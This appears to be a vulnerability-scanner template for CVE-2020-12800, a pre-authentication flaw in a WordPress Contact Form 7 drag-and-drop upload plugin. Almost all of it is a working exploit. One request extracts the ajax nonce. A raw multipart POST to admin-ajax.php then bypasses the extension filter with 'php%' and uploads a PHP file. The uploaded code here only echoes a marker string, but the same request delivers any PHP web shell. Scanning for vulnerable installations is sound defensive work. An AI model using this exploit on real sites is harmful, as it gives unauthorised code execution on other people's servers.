id: CVE-2020-12800

info:
  name: WordPress 'Drag & Drop Multiple File Upload - Contact Form 7' Plugin - Pre-auth RCE
  author: dwisiswant0
  severity: critical

  # This template exploits a file upload feature of Drag and Drop Multi File
  # Upload - Contact Form 7 for versions prior to 1.3.4. The allowed file
  # extension list can be bypassed by appending a %, allowing for php
  # shells to be uploaded. No authentication is required for exploitation.
  # -
  # References:
  # > https://github.com/amartinsec/CVE-2020-12800

requests:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
        Accept: */*
        Connection: close
      - |
        POST /wp-admin/admin-ajax.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Language: en-US,en;q=0.5
        Content-Type: multipart/form-data; boundary=---------------------------350278735926454076983690555601
        Accept-Encoding: gzip, deflate
        X-Requested-With: XMLHttpRequest

        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="supported_type"

        php%
        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="size_limit"

        5242880
        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="action"

        dnd_codedropz_upload
        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="type"

        click
        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="security"

        nonce
        -----------------------------350278735926454076983690555601
        Content-Disposition: form-data; name="upload-file"; filename="pd.php%"
        Content-Type: text/plain

        <?php echo base64_decode('UHJvamVjdERpc2NvdmVyeQo='); ?>
        -----------------------------350278735926454076983690555601--
    redirects: true
    max-redirects: 1
    cookie-reuse: true
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: nonce
        internal: true
        part: body
        regex:
          - "(\"ajax_nonce\":\"([a-f0-9]{10})\")"